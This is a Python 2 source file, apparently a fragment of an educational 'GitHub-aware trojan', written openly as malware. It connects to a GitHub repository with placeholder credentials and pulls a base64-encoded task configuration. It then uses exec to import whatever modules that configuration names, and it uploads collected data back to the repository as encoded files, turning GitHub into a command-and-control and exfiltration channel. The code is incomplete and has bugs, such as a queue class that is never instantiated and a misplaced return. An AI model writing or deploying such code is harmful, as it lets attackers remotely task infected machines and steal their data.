import json, base64, sys, time, imp, random, threading, Queue, os
from github3 import login

trojan_id = 'abc'

trojan_config = '%s.json' % trojan_id
data_path = 'data/%s/' % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue

def connect_to_github():
    gh = login(username='xxxxxxxxx', password='xxxxxxxxx')
    repo = gh.repository('testing-gt', 'cap7')
    branch = repo.branch('master')

    return gh, repo, branch

def get_file_content(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print '[*] Found file %s' % filepath
            blob = repo.blob(filename._json_data['sha'])

            return blob.content

        return None

def get_trojan_config():
    global configured
    #global trojan_config

    config_json = get_file_content(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])
    return config

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000,100000))
    repo.create_file(remote_path, 'Commit message', base64.b64encode(data))

    return
